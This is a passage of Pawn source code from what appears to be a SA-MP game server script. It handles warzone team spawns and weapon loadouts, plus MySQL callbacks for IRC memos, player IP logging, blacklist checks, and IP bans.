				        SetPlayerPos(wzPlayer, defX + (warzonedefendersleft / 1.5), defY + (warzonedefendersleft / 1.5), defZ);
				        SetPlayerFacingAngle(wzPlayer, defA);
				        SetPlayerColor(wzPlayer, warzonecolourdefenders);
				        warzonedefendersleft++;
				    }
				    SetCameraBehindPlayer(wzPlayer);
				    SetPlayerHealth(wzPlayer, 100.0);
				    SetPlayerArmour(wzPlayer, 100.0);
				    SetPlayerVirtualWorld(wzPlayer, WORLDID_WARZONE);
				    GangZoneShowForPlayer(wzPlayer, warzonegangzone, 0xFF000050); // transparent red

				    switch (player[wzPlayer][playerwarzoneset])
				    {
				        case 1:
				        {
				        	GivePlayerWeapon(wzPlayer, 4, 1);
							GivePlayerWeapon(wzPlayer, 25, 99999);
							GivePlayerWeapon(wzPlayer, 29, 99999);
				        }
				        case 2:
				        {
				        	GivePlayerWeapon(wzPlayer, 4, 1);
							GivePlayerWeapon(wzPlayer, 23, 99999);
							GivePlayerWeapon(wzPlayer, 27, 99999);
				        }
				        case 3:
				        {
				        	GivePlayerWeapon(wzPlayer, 4, 1);
							GivePlayerWeapon(wzPlayer, 29, 99999);
							GivePlayerWeapon(wzPlayer, 31, 99999);
				        }
				        case 4:
				        {
				        	GivePlayerWeapon(wzPlayer, 4, 1);
							GivePlayerWeapon(wzPlayer, 24, 99999);
							GivePlayerWeapon(wzPlayer, 30, 99999);
				        }
				        case 5:
				        {
				        	GivePlayerWeapon(wzPlayer, 4, 1);
							GivePlayerWeapon(wzPlayer, 24, 99999);
							GivePlayerWeapon(wzPlayer, 34, 99999);
				        }
				    }
					for (new i = 0; i < VIP_MAX_OSTICKS; i++)
					{
					    if (pSObject[wzPlayer][i][so_object] != -1)
					    {
						    DestroyObject(pSObject[wzPlayer][i][so_object]);
							pSObject[wzPlayer][i][so_object] = -1;
						}
					}

					for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
					{
						if (IsPlayerAttachedObjectSlotUsed(wzPlayer, pi))
						RemovePlayerAttachedObject(wzPlayer, pi);
					}
				}
			}
			format(stringe, sizeof(stringe), "Loading Warzone. (Base: \"%s\" - Mode: Convoy)", strValue);
			format(ircstring, sizeof(ircstring), "6Loading Warzone. (Base: \"%s\" - Mode: Convoy)", strValue);
		} else {
		    for (new wzPlayer; wzPlayer < MAX_PLAYERS; wzPlayer++)
			{
				if (IsPlayerConnected(wzPlayer) && player[wzPlayer][playingwarzone] == 1)
				{
				    TogglePlayerControllable(wzPlayer, 0);
					player[wzPlayer][antifall] 	= 0;
					player[wzPlayer][godmode] 	= 0;
					player[wzPlayer][vgodmode] 	= 0;
				 	player[wzPlayer][running] 	= 0;
				 	player[wzPlayer][walking]	= 0;
				    player[wzPlayer][skating] 	= 0;
				    player[wzPlayer][swimming] 	= 0;
					if (player[wzPlayer][strew] == 1)
					{
						player[wzPlayer][strew] = 0;
						KillTimer(player[wzPlayer][aftimer]);
						DestroyPlayerObject(wzPlayer, player[wzPlayer][strewid]);
						player[wzPlayer][strewid] = -1;
					}

					for (new listplayers = 0; listplayers < MAX_WARZONE_PLAYERS; listplayers++)
					{
					    if (warzoneplayerlist[listplayers] == -1)
					    {
						  	warzoneplayerlist[listplayers] = wzPlayer;
						  	break;
					  	}
					}

				    if (player[wzPlayer][playerwarzoneteam] == 0)
				    {
					    if (warzoneattackers > warzonedefenders)
						{
							player[wzPlayer][playerwarzoneteam] = 2;
							warzonedefenders++;
					    } else {
							player[wzPlayer][playerwarzoneteam] = 1;
							warzoneattackers++;
						}
						player[wzPlayer][playerwarzoneset] = random(5)+1;
				    }
				    
				    if (player[wzPlayer][playerwarzoneteam] == 1)
				    {
				        SetPlayerSkin(wzPlayer, warzoneskinattackers);
					    SetPlayerInterior(wzPlayer, 9);
				        SetPlayerPos(wzPlayer, 315.85, 1020.00 - (warzoneattackersleft / 1.5), 1951.00 + (warzoneattackersleft / 1.5));
				        SetPlayerFacingAngle(wzPlayer, 0.00);
				        SetPlayerColor(wzPlayer, warzonecolourattackers);
				        warzoneattackersleft++;
				    } else {
				        SetPlayerSkin(wzPlayer, warzoneskindefenders);
					    SetPlayerInterior(wzPlayer, 0);
				        SetPlayerPos(wzPlayer, defX + (warzonedefendersleft / 1.5), defY + (warzonedefendersleft / 1.5), defZ);
				        SetPlayerFacingAngle(wzPlayer, defA);
				        SetPlayerColor(wzPlayer, warzonecolourdefenders);
				        warzonedefendersleft++;
				    }
				    SetCameraBehindPlayer(wzPlayer);
				    SetPlayerHealth(wzPlayer, 100.0);
				    SetPlayerArmour(wzPlayer, 100.0);
				    SetPlayerVirtualWorld(wzPlayer, WORLDID_WARZONE);
				    GangZoneShowForPlayer(wzPlayer, warzonegangzone, 0xFF000050); // transparent red

				    switch (player[wzPlayer][playerwarzoneset])
				    {
				        case 1:
				        {
				        	GivePlayerWeapon(wzPlayer, 4, 1);
							GivePlayerWeapon(wzPlayer, 25, 99999);
							GivePlayerWeapon(wzPlayer, 29, 99999);
				        }
				        case 2:
				        {
				        	GivePlayerWeapon(wzPlayer, 4, 1);
							GivePlayerWeapon(wzPlayer, 23, 99999);
							GivePlayerWeapon(wzPlayer, 27, 99999);
				        }
				        case 3:
				        {
				        	GivePlayerWeapon(wzPlayer, 4, 1);
							GivePlayerWeapon(wzPlayer, 29, 99999);
							GivePlayerWeapon(wzPlayer, 31, 99999);
				        }
				        case 4:
				        {
				        	GivePlayerWeapon(wzPlayer, 4, 1);
							GivePlayerWeapon(wzPlayer, 24, 99999);
							GivePlayerWeapon(wzPlayer, 30, 99999);
				        }
				        case 5:
				        {
				        	GivePlayerWeapon(wzPlayer, 4, 1);
							GivePlayerWeapon(wzPlayer, 24, 99999);
							GivePlayerWeapon(wzPlayer, 34, 99999);
				        }
				    }
					for (new i = 0; i < VIP_MAX_OSTICKS; i++)
					{
					    if (pSObject[wzPlayer][i][so_object] != -1)
					    {
						    DestroyObject(pSObject[wzPlayer][i][so_object]);
							pSObject[wzPlayer][i][so_object] = -1;
						}
					}

					for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
					{
						if (IsPlayerAttachedObjectSlotUsed(wzPlayer, pi))
						RemovePlayerAttachedObject(wzPlayer, pi);
					}
				}
			}
			warzonecheckpoint_airborne = CreateDynamicRaceCP(3, 315.80, 1032.23, 1946.80, 315.80, 1035.23, 1946.80, 3.0, WORLDID_WARZONE, _, _, 25.0);
			format(stringe, sizeof(stringe), "Loading Warzone. (Base: \"%s\" - Mode: Airborne)", strValue);
			format(ircstring, sizeof(ircstring), "6Loading Warzone. (Base: \"%s\" - Mode: Airborne)", strValue);
		}
		warzonecheckpoint_base = CreateDynamicCP(warzonecpx, warzonecpy, warzonecpz, cpSize, WORLDID_WARZONE, _, _, 2000.0);

		for (new cp = 0; cp < MAX_PLAYERS; cp++)
		{
			if (IsPlayerConnected(cp) && player[cp][playingwarzone] == 1)
			SendServerMessage(cp, EMBED_PINKRED, stringe);
		}
		IRC_GroupSay(1, IRC_CHANNEL, ircstring);

	 	format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM "MYSQL_TABLE_WARZONE_VEHICLES" WHERE `warzone_base_id` = %d", warzonebase);
		mysql_run_query(mysqlConnection, mysqlStr, true, "QS_LoadWarzoneVehicles", "");
	} else {
		StopWarzone();
		for (new cp = 0; cp < MAX_PLAYERS; cp++)
		{
			if (IsPlayerConnected(cp) && player[cp][playingwarzone] == 1)
			{
				if (servergodmode) player[cp][godmode] = 1;
				SetPlayerColor(cp, PlayerColors[random(sizeof(PlayerColors))]);
				player[cp][playingwarzone] = 0;
				player[cp][playerwarzoneteam] = 0;
				if (player[cp][playerwarzonemode] == 1)
				{
					SpawnPlayer(cp);
					player[cp][playerwarzonemode] = 0;
				} else {
					player[cp][Spectating] = 0;
					player[cp][SpectatingOn] = -1;
				    TogglePlayerSpectating(cp, false);
				}
			 	player[cp][playerwarzoneset] = 0;
				player[cp][moviecrew] = -1;
				SetPlayerTeam(cp, cp);
				SetPlayerArmour(cp, 0.00);
			}
		}
		SendServerMessageToAll(EMBED_PINKRED, "Stopped Warzone. (Could not load Warzone base)");
		IRC_GroupSay(1, IRC_CHANNEL, "6Stopped Warzone. (Could not load Warzone base)");
	}
	return 1;
}

forward QS_LoadWarzoneVehicles();
public QS_LoadWarzoneVehicles()
{
	querybalance--;

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
        (0) warzone_vehicle_id       int(11)
        (1) warzone_base_id          int(11)
        (2) warzone_vehicle_model_id int(11)
        (3) warzone_vehicle_x        float
        (4) warzone_vehicle_y        float
        (5) warzone_vehicle_z        float
        (6) warzone_vehicle_angle    float
		*/

		new strValue[11],
			vModelID,
			Float:vPosX,
			Float:vPosY,
			Float:vPosZ,
			Float:vPosRot,
			vVehicleID;


	    for (new BaseVehicle = 0; BaseVehicle < rows; BaseVehicle++)
		{
	        cache_get_row(BaseVehicle, 2, strValue);  vModelID = strval(strValue);
	        cache_get_row(BaseVehicle, 3, strValue);  vPosX = floatstr(strValue);
	        cache_get_row(BaseVehicle, 4, strValue);  vPosY = floatstr(strValue);
	        cache_get_row(BaseVehicle, 5, strValue);  vPosZ = floatstr(strValue);
	        cache_get_row(BaseVehicle, 6, strValue);  vPosRot = floatstr(strValue);

			vVehicleID = CreateVehicle(vModelID, vPosX, vPosY, vPosZ, vPosRot, 30, 30, 3600000);
			SetVehicleVirtualWorld(vVehicleID, WORLDID_WARZONE);
		}

	}
	return 1;
}

/*** IRC-MySQL callbacks ***/
forward QS_LogPlayerAccount(playerid, name[], ip[], host[]);
public QS_LogPlayerAccount(playerid, name[], ip[], host[])
{
	querybalance--;

    new rows, fields,
		ip_connect_date[11],
		mysqlStr[216];

	getdate(year, month, day);
	format(ip_connect_date, sizeof(ip_connect_date), "%d-%02d-%02d", year, month, day);
    mysql_real_escape_string(name, name);

    cache_get_data(rows, fields);
    if (rows) // player matches name with the same last used ip
    {
	 	format(mysqlStr, sizeof(mysqlStr),  "UPDATE "MYSQL_TABLE_IPS" SET `ip_connect_date` = '%s' WHERE `ip_name` = '%s' AND `ip_connect_ip` = '%s' LIMIT 1", ip_connect_date, name, ip);
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
	} else { // if not, log to mysql
	 	format(mysqlStr, sizeof(mysqlStr),  "INSERT INTO "MYSQL_TABLE_IPS" (ip_name, ip_connect_ip, ip_connect_host, ip_connect_date) VALUES('%s', '%s', '%s', '%s')", name, ip, host, ip_connect_date);
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
	}
	return 1;
}

forward QS_CheckPlayerBlacklist(playerid, ccinc, host[]);
public QS_CheckPlayerBlacklist(playerid, ccinc, host[])
{
	querybalance--;
	checkcinc();

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*  `host_name`
		(0) host_name   varchar(50)
		*/

        new strValue[50];
	    for (new blacklists = 0; blacklists < rows; blacklists++)
		{
  			cache_get_row(blacklists, 0, strValue);
			if (strfind(host, strValue, true) !=-1)
			{
	    		/*SendClientMessage(extra, COLOR_PINK, "u mad?");
				format(rMsg, sizeof(rMsg), "Server: Kicked %s. (Reason: Blacklisted)", name);
				SendServerMessageToAll(EMBED_RED, rMsg);
				printflog("KICK-A", rMsg);
				format(rMsg, sizeof(rMsg), "8,1Server: Kicked %s. (Reason: Blacklisted)", name);
				IRC_GroupSay(1, IRC_CHANNEL, rMsg);
				KickEx(extra);*/
			 	player[playerid][muted] = 1;
				SetTimerEx("TimedKick", 4000, 0, "i", playerid);
			}
        }

	}
	return 1;
}

forward QS_LoginUserAccount(user[], botid);
public QS_LoginUserAccount(user[], botid)
{
	querybalance--;

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0)	account_id      	int(11)
		(1)	account_name        varchar(24)
		(2)	account_password    varchar(129)
		(3)	account_vip         tinyint(1)
		(4)	account_admin       tinyiny(1)
		*/

        new strValue[50];

		cache_get_row(0, 3, strValue);
		if (strval(strValue) == 1)
		{
			new logStr[80];
	    	/*if (CheckAccountBan(account_id)) <-- vips aren't banned, or shouldn't :|
	    	{
				format(logstr, sizeof(logstr), "6IRC: %s was denied access. (Logging in with banned account.)", user);
				IRC_Say(botid, IRCOP_CHANNEL, logstr);
				return 1;
			}*/

			format(logStr, sizeof(logStr), "6IRC: %s has succesfully logged in as xMovie member.", user);
			IRC_Say(botid, IRCOP_CHANNEL, logStr);
			format(strValue, sizeof(strValue), "+v %s", user);
			IRC_SetMode(botid, IRC_CHANNEL, strValue);
		}
	} //else IRC_Notice(botid, user, "4>> ERROR: Incorrect username or password.");
	return 1;
}

forward QS_SaveUserMemo(botid, user[], user_target[], message_target[]);
public QS_SaveUserMemo(botid, user[], user_target[], message_target[])
{
	querybalance--;

    new rows, fields,
		memo_firstfreeid = 0,
		memo_date[11],
		memo_time[9],
		rMsg[50],
		mysqlStr[431];

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) memo_target     varchar(24)
		(1) memo_id         int(11)
		(2) memo_sender     varchar(24)
		(3) memo_read       tinyint(1)
		(4) memo_date       date
		(5) memo_time       time
		(6) memo_message    varchar(200)
		*/

	    for (new total_memos = 0; total_memos < rows; total_memos++)
	    {
	        if (total_memos == memo_firstfreeid)
			memo_firstfreeid++;
	    }
	}
	getdate(year, month, day);
	gettime(hour, minute, second);
	format(memo_date, sizeof(memo_date), "%d-%02d-%02d", year, month, day);
	format(memo_time, sizeof(memo_time), "%02d:%02d:%02d", hour, minute, second);

    mysql_real_escape_string(user, user);
    mysql_real_escape_string(user_target, user_target);
    mysql_real_escape_string(message_target, message_target);
 	format(mysqlStr, sizeof(mysqlStr),  "INSERT INTO "MYSQL_TABLE_MEMOS" (memo_target, memo_id, memo_sender, memo_read, memo_date, memo_time, memo_message) VALUES('%s', %d, '%s', 0, '%s', '%s', '%s')", user_target, memo_firstfreeid, user, memo_date, memo_time, message_target);
	mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

	format(rMsg, sizeof(rMsg), "5Your memo has been sent to %s.", user_target);
	IRC_Notice(botid, user, rMsg);
	return 1;
}

forward QS_CheckPlayerMemos(user[24]);
public QS_CheckPlayerMemos(user[24])
{
	querybalance--;

    new rows, fields,
   		uMsg[93];

    cache_get_data(rows, fields);
    if (rows) // player has unread memo(s)
    {
		gettime(hour, minute, second);
		if (hour < 12) format(uMsg, sizeof(uMsg), "1Good morning Mr %s, you have3 %d 1unread memo(s) waiting for you.", user, rows);
		else if (12 <= hour <= 17) format(uMsg, sizeof(uMsg), "1Good afternoon Mr %s, you have3 %d 1unread memo(s) waiting for you.", user, rows);
		else if (hour > 17) format(uMsg, sizeof(uMsg), "1Good evening Mr %s, you have3 %d 1unread memo(s) waiting for you.", user, rows);
		IRC_GroupSay(1, IRC_CHANNEL, uMsg);
	}
	return 1;
}

forward QS_ReadUserMemo(botid, user[], memo_id);
public QS_ReadUserMemo(botid, user[], memo_id)
{
	querybalance--;

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) memo_target     varchar(24)
		(1) memo_id         int(11)
		(2) memo_sender     varchar(24)
		(3) memo_read       tinyint(1)
		(4) memo_date       date
		(5) memo_time       time
		(6) memo_message    varchar(200)
		*/

        new strValue[2],
			memo_sender[24],
			memo_date[11],
			memo_time[9],
			memo_message[200],
			rMsg[244];

		cache_get_row(0, 2, memo_sender);
		cache_get_row(0, 3, strValue);
		if (!strval(strValue))
		{
		    new mysqlStr[129];

		    mysql_real_escape_string(user, user);
		 	format(mysqlStr, sizeof(mysqlStr),  "UPDATE "MYSQL_TABLE_MEMOS" SET `memo_read` = 1 WHERE `memo_target` = '%s' AND `memo_id` = %d LIMIT 1", user, memo_id);
			mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
		}
		cache_get_row(0, 4, memo_date);
		cache_get_row(0, 5, memo_time);
		cache_get_row(0, 6, memo_message);

		format(rMsg, sizeof(rMsg), "5[%d] 7(%s | %s)5 %s: %s", memo_id+1, memo_date, memo_time, memo_sender, memo_message);
		IRC_Notice(botid, user, rMsg);
	} else IRC_Notice(botid, user, "5Memo not found.");
	return 1;
}

forward QS_ListUserMemos(botid, user[]);
public QS_ListUserMemos(botid, user[])
{
	querybalance--;

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) memo_target     varchar(24)
		(1) memo_id         int(11)
		(2) memo_sender     varchar(24)
		(3) memo_read       tinyint(1)
		(4) memo_date       date
		(5) memo_time       time
		(6) memo_message    varchar(200)
		*/

	    new strValue[2],
			unread_memos = 0,
			memo_id,
			memo_sender[24],
			memo_read,
			memo_date[11],
			memo_time[9],
			visiblememos = 0,
			rMsg[80];

	    for (new total_memos = 0; total_memos < rows; total_memos++)
	    {
            if (visiblememos < 11) // only show first 10
            {
				cache_get_row(total_memos, 1, strValue);    memo_id = strval(strValue);
				cache_get_row(total_memos, 2, memo_sender);
				cache_get_row(total_memos, 3, strValue);    memo_read = strval(strValue);
				cache_get_row(total_memos, 4, memo_date);
				cache_get_row(total_memos, 5, memo_time);

				if (!memo_read) format(rMsg, sizeof(rMsg), "5[%d] 3(%s | %s)5 %s", memo_id+1, memo_date, memo_time, memo_sender);
				else format(rMsg, sizeof(rMsg), "5[%d] 4(%s | %s)5 %s", memo_id+1, memo_date, memo_time, memo_sender);
				IRC_Notice(botid, user, rMsg);

				if (!memo_read)
				unread_memos++;

				visiblememos++;
			}
	    }
		format(rMsg, sizeof(rMsg), "1You have a total of %d memo(s), where3 %d 1are unread. (Server time: GMT+0)", rows, unread_memos);
		IRC_Notice(botid, user, rMsg);
	} else IRC_Notice(botid, user, "You have no memos.");
	return 1;
}

forward QS_RemoveUserMemo(botid, user[], memo_id);
public QS_RemoveUserMemo(botid, user[], memo_id)
{
	querybalance--;

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) memo_target     varchar(24)
		(1) memo_id         int(11)
		(2) memo_sender     varchar(24)
		(3) memo_read       tinyint(1)
		(4) memo_date       date
		(5) memo_time       time
		(6) memo_message    varchar(200)
		*/

		new memo_sender[24],
			rMsg[50],
			mysqlStr[114];
		cache_get_row(0, 2, memo_sender);

	    mysql_real_escape_string(user, user);
	 	format(mysqlStr, sizeof(mysqlStr),  "DELETE FROM "MYSQL_TABLE_MEMOS" WHERE `memo_target` = '%s' AND `memo_id` = %d LIMIT 1", user, memo_id);
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

		format(rMsg, sizeof(rMsg), "5Memo %d from %s has been deleted.", memo_id+1, memo_sender);
		IRC_GroupSay(1, IRCOP_CHANNEL, rMsg);
	} else IRC_Notice(botid, user, "5Memo not found.");
	return 1;
}

forward QS_CheckPlayerInfoIRC();
public QS_CheckPlayerInfoIRC()
{
	querybalance--;

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) ip_id           int(11)
		(1) ip_name         varchar(24)
		(2) ip_connect_ip   varchar(16)
		(3) ip_connect_host varchar(75)
		(4) ip_connect_date date
		*/

        new matches = 0,
            ipStr[282],
			ip_name[24],
			ip_connect_ip[16],
			ip_connect_host[75],
			ip_connect_date[11],
			ip_country[35] = "Unknown",
			ip_country_code[3] = "XX";

	    for (new infoMatches = 0; infoMatches < rows; infoMatches++)
		{
			if (matches < 11) // only show first 10
			{
		        cache_get_row(infoMatches, 1, ip_name);
		        cache_get_row(infoMatches, 2, ip_connect_ip);
		        cache_get_row(infoMatches, 3, ip_connect_host);
		        cache_get_row(infoMatches, 4, ip_connect_date);

		    	GetCountryName(ip_connect_ip, ip_country);
				GetCountryCode(ip_connect_ip, ip_country_code);

				format(ipStr, sizeof(ipStr), "4 %s's IP:7 %s 4| Host:7 %s 4| Last seen:7 %s 4| Country:7 %s (%s)", ip_name, ip_connect_ip, ip_connect_host, ip_connect_date, ip_country, ip_country_code);
				IRC_GroupSay(1, IRCOP_CHANNEL, ipStr);
			}
			matches++;
        }
		format(ipStr, sizeof(ipStr), "4 %d match(es) found.", matches);
		IRC_GroupSay(1, IRCOP_CHANNEL, ipStr);
	} else IRC_GroupSay(1, IRCOP_CHANNEL, "4>> ERROR: No such user exists.");
	return 1;
}

forward QS_CheckPlayerIpMatchIRC(params[]);
public QS_CheckPlayerIpMatchIRC(params[])
{
	querybalance--;

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) ip_id           int(11)
		(1) ip_name         varchar(24)
		(2) ip_connect_ip   varchar(16)
		(3) ip_connect_host varchar(75)
		(4) ip_connect_date date
		*/

        new ipmatchStr[500],
			ip_name[24];

		format(ipmatchStr, sizeof(ipmatchStr), "4[IPmatch \"%s\"]", params);
	    for (new ipMatches = 0; ipMatches < rows; ipMatches++)
		{
  			cache_get_row(ipMatches, 1, ip_name);
			if (strlen(ipmatchStr) <= 355)
			{
				format(ipmatchStr, sizeof(ipmatchStr), "%s %s", ipmatchStr, ip_name);
			} else {
				IRC_GroupSay(1, IRCOP_CHANNEL, ipmatchStr);
				format(ipmatchStr, sizeof(ipmatchStr), "4 %s", ip_name);
			}
        }
		if (strlen(ipmatchStr) <= 468)
		IRC_GroupSay(1, IRCOP_CHANNEL, ipmatchStr);
	} else IRC_GroupSay(1, IRCOP_CHANNEL, "4>> ERROR: No matching IP found in database.");
	return 1;
}

forward QS_CheckPlayerHostMatchIRC();
public QS_CheckPlayerHostMatchIRC()
{
	querybalance--;

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) ip_id           int(11)
		(1) ip_name         varchar(24)
		(2) ip_connect_ip   varchar(16)
		(3) ip_connect_host varchar(75)
		(4) ip_connect_date date
		*/

        new matches = 0,
            hostmatchStr[282],
			ip_name[24],
			ip_connect_ip[16],
			ip_connect_host[75],
			ip_connect_date[11],
			ip_country[35] = "Unknown",
			ip_country_code[3] = "XX";

	    for (new infoMatches = 0; infoMatches < rows; infoMatches++)
		{
			if (matches < 11) // only show first 10
			{
		        cache_get_row(infoMatches, 1, ip_name);
		        cache_get_row(infoMatches, 2, ip_connect_ip);
		        cache_get_row(infoMatches, 3, ip_connect_host);
		        cache_get_row(infoMatches, 4, ip_connect_date);

		    	GetCountryName(ip_connect_ip, ip_country);
				GetCountryCode(ip_connect_ip, ip_country_code);

				format(hostmatchStr, sizeof(hostmatchStr), "4 %s's IP:7 %s 4| Host:7 %s 4| Last seen:7 %s 4| Country:7 %s (%s)", ip_name, ip_connect_ip, ip_connect_host, ip_connect_date, ip_country, ip_country_code);
				IRC_GroupSay(1, IRCOP_CHANNEL, hostmatchStr);
			}
			matches++;
        }
		format(hostmatchStr, sizeof(hostmatchStr), "4 %d match(es) found.", matches);
		IRC_GroupSay(1, IRCOP_CHANNEL, hostmatchStr);
	} else IRC_GroupSay(1, IRCOP_CHANNEL, "4>> ERROR: No matching HOST found in database.");
	return 1;
}

forward QS_CheckPlayerBanMatchIRC();
public QS_CheckPlayerBanMatchIRC()
{
	querybalance--;

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) ban_id      	int(11)
		(1) account_id  	int(11)
		(2) ban_ip      	varchar(16)
		(3) ban_name    	varchar(24)
		(4) ban_reason  	varchar(200)
		(5) ban_issue_date  date
		(6) ban_issue_time  time
		(7) ban_expire_date date
		(8) ban_expire_time time
		(9) admin_id        int(11)
		*/

        new matches = 0,
			banmatchStr[150],
			strValue[10],
			ban_id,
			account_id,
			ban_ip[16],
			ban_name[24],
			ban_reason[200],
			ban_issue_date[11],
			ban_issue_time[9],
			admin_id,
			mysqlStr[79];

	    for (new banMatches = 0; banMatches < rows; banMatches++)
		{
			if (matches < 11) // only show first 10
			{
	  			cache_get_row(banMatches, 0, strValue); 		ban_id = strval(strValue);
	  			cache_get_row(banMatches, 1, strValue); 		account_id = strval(strValue);
	  			cache_get_row(banMatches, 2, ban_ip);
	  			cache_get_row(banMatches, 3, ban_name);
	  			cache_get_row(banMatches, 4, ban_reason);
	  			cache_get_row(banMatches, 5, ban_issue_date);
	  			cache_get_row(banMatches, 6, ban_issue_time);
	  			cache_get_row(banMatches, 9, strValue); 		admin_id = strval(strValue);

		  		format(banmatchStr, sizeof(banmatchStr), "[Ban #%d | Account #%d] %s [%s | %s] %s - %s", ban_id, account_id, ban_ip, ban_issue_date, ban_issue_time, ban_name, ban_reason);
	  			if (!admin_id)
	  			{
					IRC_GroupSay(1, IRCOP_CHANNEL, banmatchStr);
				} else {
				 	format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM "MYSQL_TABLE_ACCOUNTS" WHERE `account_id` = %d LIMIT 1", admin_id);
					mysql_run_query(mysqlConnection, mysqlStr, true, "QS_CheckPlayerBanMatchIRC2", "s", banmatchStr);
				}
			}
			matches++;
        }
		format(banmatchStr, sizeof(banmatchStr), "4 %d match(es) found.", matches);
		IRC_GroupSay(1, IRCOP_CHANNEL, banmatchStr);
	} else IRC_GroupSay(1, IRCOP_CHANNEL, "4>> ERROR: No matching IP found in database.");
	return 1;
}

forward QS_CheckPlayerBanMatchIRC2(message[150]);
public QS_CheckPlayerBanMatchIRC2(message[150])
{
	querybalance--;

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0)	account_id      	int(11)
		(1)	account_name        varchar(24)
		(2)	account_password    varchar(129)
		(3)	account_vip         tinyint(1)
		(4)	account_admin       tinyint(1)
		*/

        new strValue[24];

		cache_get_row(0, 1, strValue);
		format(message, sizeof(message), "%s [Ban by %s]", message, strValue);
	}
	IRC_GroupSay(1, IRCOP_CHANNEL, message);
	return 1;
}

forward QS_CheckPlayerNameMatchIRC(name[]);
public QS_CheckPlayerNameMatchIRC(name[])
{
	querybalance--;

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) ip_id           int(11)
		(1) ip_name         varchar(24)
		(2) ip_connect_ip   varchar(16)
		(3) ip_connect_host varchar(75)
		(4) ip_connect_date date
		*/

        new namematchStr[500],
			ip_name[24];

		format(namematchStr, sizeof(namematchStr), "4[NAMEmatch \"%s\"]", name);
	    for (new nameMatches = 0; nameMatches < rows; nameMatches++)
		{
  			cache_get_row(nameMatches, 1, ip_name);
			if (strlen(namematchStr) <= 458)
			{
				format(namematchStr, sizeof(namematchStr), "%s %s", namematchStr, ip_name);
			} else {
				IRC_GroupSay(1, IRCOP_CHANNEL, namematchStr);
				format(namematchStr, sizeof(namematchStr), "4 %s", ip_name);
			}
        }
		if (strlen(namematchStr) <= 355)
		IRC_GroupSay(1, IRCOP_CHANNEL, namematchStr);
	} else IRC_GroupSay(1, IRCOP_CHANNEL, "4>> ERROR: No matching NAME found in database.");
	return 1;
}

forward QS_BanPlayerIP(user[], params[], reason[]);
public QS_BanPlayerIP(user[], params[], reason[])
{
	querybalance--;

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) ban_id      	int(11)
		(1) account_id  	int(11)
		(2) ban_ip      	varchar(16)
		(3) ban_name    	varchar(24)
		(4) ban_reason  	varchar(200)
		(5) ban_issue_date  date
		(6) ban_issue_time  time
		(7) ban_expire_date date
		(8) ban_expire_time time
		(9) admin_id        int(11)
		*/

		IRC_GroupSay(1, IRCOP_CHANNEL, "4>> ERROR: This IP is already banned.");
	} else {
		new ban_name[50],
			ban_date[11],
		    ban_time[9],
			mysqlStr[318],
			command[30],
			msg[75];

		format(ban_name, sizeof(ban_name), "IRC ban by %s", user);
		getdate(year, month, day);
		gettime(hour, minute, second);
		format(ban_date, sizeof(ban_date), "%d-%02d-%02d", year, month, day);
		format(ban_time, sizeof(ban_time), "%02d:%02d:%02d", hour, minute, second);
	    mysql_real_escape_string(ban_name, ban_name);
	    mysql_real_escape_string(reason, reason);
	 	format(mysqlStr, sizeof(mysqlStr),  "INSERT INTO "MYSQL_TABLE_BANS" (account_id, ban_ip, ban_name, ban_reason, ban_issue_date, ban_issue_time, ban_expire_date, ban_expire_time, admin_id) VALUES(0, '%s', '%s', '%s', '%s', '%s', '0000-00-00', '00:00:00', 0)", params, ban_name, reason, ban_date, ban_time);
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

		format(command, sizeof(command), "banip %s", params);
		SendRconCommand(command);

		format(msg, sizeof(msg), "*** The IP '%s' has been 5banned by %s.", params, user);
		IRC_GroupSay(1, IRCOP_CHANNEL, msg);
		printflog("IRC", msg);
	}
	return 1;
}

forward QS_UnbanPlayerIP(user[], params[]);
public QS_UnbanPlayerIP(user[], params[])
{
	querybalance--;

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) ban_id      	int(11)
		(1) account_id  	int(11)
		(2) ban_ip      	varchar(16)
		(3) ban_name    	varchar(24)
		(4) ban_reason  	varchar(200)
		(5) ban_issue_date  date
		(6) ban_issue_time  time
		(7) ban_expire_date date
		(8) ban_expire_time time
		(9) admin_id        int(11)
		*/

		new	mysqlStr[76],
			command[25],
			msg[75];

	    mysql_real_escape_string(params, params);
	 	format(mysqlStr, sizeof(mysqlStr),  "DELETE FROM "MYSQL_TABLE_BANS" WHERE `ban_ip` = '%s' LIMIT 1", params);
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

		format(command, sizeof(command), "unbanip %s", params);
		SendRconCommand(command);

		format(msg, sizeof(msg), "*** The IP '%s' has been 7un5banned by %s.", params, user);
		IRC_GroupSay(1, IRCOP_CHANNEL, msg);
		printflog("IRC", msg);
	} else IRC_GroupSay(1, IRCOP_CHANNEL, "4>> ERROR: This IP is not banned.");
	return 1;
}

forward QS_BanPlayerHost(user[], params[], description[]);
public QS_BanPlayerHost(user[], params[], description[])
{
	querybalance--;

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {

        /*
		(0) host_name      		varchar(50)
